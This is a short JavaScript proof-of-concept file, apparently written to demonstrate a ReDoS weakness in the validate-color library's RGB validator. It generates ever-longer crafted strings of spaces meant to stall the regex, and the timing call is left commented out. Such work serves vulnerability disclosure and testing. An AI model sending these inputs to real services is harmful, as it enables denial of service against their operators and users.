var validateColor = require('../lib/index');

function build_blank(n) {
//  let ret = "rgb(0" // original
 let ret = "rg"
 for (let i = 0; i < n; i++) {
  ret += " "
 }
 return ret + "!";
}

// 'rg !'
// 'rg  !'

// * Simulating 'validateColor.validateHTMLColorRgb('rgb(0 0 0)')'

for(let i = 1; i <= 5000000; i++) {
  const attackStr = build_blank(i)
  if (i < 30) {
    console.log('🚀 ~ file: redos.js:21 ~ attackStr', attackStr);
  }
//   if (i % 100 === 0) {
//     const time = Date.now();
//     const attackStr = build_blank(i)
//     // validateColor.validateHTMLColorRgb(attackStr)
//     const timeCost = Date.now() - time;
//     console.log(`attackStr.length: ${attackStr.length}: ${timeCost} ms`)
//  }
}
